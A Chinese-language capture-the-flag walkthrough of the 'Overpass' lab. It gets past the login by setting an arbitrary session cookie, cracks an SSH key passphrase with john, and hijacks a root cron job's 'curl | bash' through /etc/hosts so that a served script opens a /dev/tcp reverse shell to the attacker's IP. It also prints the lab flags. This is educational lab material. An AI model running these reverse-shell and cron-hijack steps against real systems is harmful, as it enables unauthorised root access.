# Overpass

循例，nmap扫一波

开了22和80

gobuster扫一波web，扫到/admin

查看一下源代码，发现了login.js和cookie.js

在文件里面找到了

    const statusOrCookie = await response.text()

    if (statusOrCookie === "Incorrect credentials") {

        loginStatus.textContent = "Incorrect Credentials"

        passwordBox.value=""

    } else {

        Cookies.set("SessionToken",statusOrCookie)

        window.location = "/admin"

    }

这段代码很简单，只要我们携带了SessionToken，不管这个值是什么，都可以

携带之后，再次访问：

    <div class="bodyFlexContainer content">

        <div>

            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>

            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>

                Also, we really need to talk about this "Military Grade" encryption. - Paradox

    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,
    .....

得到了一个ssh密钥和用户名james

使用ssh2john为密钥生成hash

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">ssh2john</font> <u style="text-decoration-style:single">./test1.txt</u> <font color="#277FFF"><b>&gt;</b></font> <u style="text-decoration-style:single">./hash</u></pre>

john爆破

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">john</font> <font color="#9755B3">--wordlist=/usr/share/wordlists/rockyou.txt</font> <u style="text-decoration-style:single">./hash</u>                 1 <font color="#EC0101"><b>⨯</b></font>
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
<font color="#FEA44C">james13</font>          (<font color="#FEA44C">./test1.txt</font>)     
</pre>

修改密钥文件的权限为600并登录ssh

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">chmod</font> 600 <u style="text-decoration-style:single">./test1.txt</u>                                                                                              
<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">ssh</font> james@10.10.251.61 <font color="#9755B3">-i</font> <u style="text-decoration-style:single">./test1.txt</u>
Enter passphrase for key &apos;./test1.txt&apos;: 
</pre>


<pre><font color="#47D4B9"><b>james@overpass-prod</b></font>:<font color="#277FFF"><b>~</b></font>$ cat ./user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}</pre>

cat /etc/crontab有一条root的任务：

    # m h dom mon dow user	command
    17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
    25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    # Update builds from latest code
    * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

我们可以修改/etc/hosts将ip改为我们攻击机的ip并开启服务

攻击机：

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">mkdir</font> ./downloads/                                                      1 <font color="#EC0101"><b>⨯</b></font>
                                                                                
<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">mkdir</font> ./downloads/src 
                                                                                
<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">touch</font> ./downloads/src/buildscript.sh</pre>

buildscript.sh内容：

    #!/bin/bash
    bash -i >& /dev/tcp/10.11.17.14/8888 0>&1

python3 -m http.server 80

静等一分钟：

    Ncat: Connection from 10.10.251.61.
    Ncat: Connection from 10.10.251.61:53498.
    bash: cannot set terminal process group (2654): Inappropriate ioctl for device
    bash: no job control in this shell
    root@overpass-prod:~# 
    root@overpass-prod:~# cat /root/root.txt
    cat /root/root.txt
    thm{7f336f8c359dbac18d54fdd64ea753bb}


另外我发现ubuntu版本是18.04，并且gcc正常，有可能存在CVE-2021-3493
